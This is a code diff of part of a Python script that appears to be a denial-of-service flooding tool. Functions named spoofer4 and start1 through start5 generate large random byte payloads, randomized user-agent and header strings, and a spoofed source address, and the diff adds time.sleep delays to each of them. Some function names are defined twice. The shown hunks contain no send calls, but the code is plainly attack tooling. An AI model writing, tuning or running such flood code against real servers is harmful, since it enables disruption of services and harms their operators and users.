@@ -419,6 +419,7 @@ def spoofer4():
     return byte8
 def spoofer4():
     global byte5
+    time.sleep(0.02)
     byte5 = random._urandom(5491)
     addr = [192, 168, 0, 1]
     d = '.'
@@ -434,6 +435,7 @@ def spoofer4():
 def start2():
   global useragents, acceptall, ref, socks5
   global byte3, byte4, byte_host
+  time.sleep(0.01)
   byte3 = random._urandom(40552)
   byte4 = random.choice(acceptall)+random.choice(ref)
   reef = random.choice(ref)
@@ -460,6 +462,7 @@ def start2():
 def spoofer4():
   global byte7, byte8, byte9
   global useragents, socks2, socks5, ref, acceptall
+  time.sleep(1)
   byte8 = random._urandom(8901)
   byte9 = random._urandom(4455)
   Socks0 = random.choice(useragents)+random.choice(socks2)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
@@ -492,6 +495,7 @@ def spoofer4():
 def start1():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
+  time.sleep(3)
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
@@ -517,6 +521,7 @@ def start1():
 def start2():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
+  time.sleep(0.05)
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
@@ -542,6 +547,7 @@ def start2():
 def start5():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
+  time.sleep(3)
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
@@ -567,6 +573,7 @@ def start5():
 def start4():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
+  time.sleep(1)
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
@@ -592,6 +599,7 @@ def start4():
 def start():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
+  time.sleep(0.01)
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
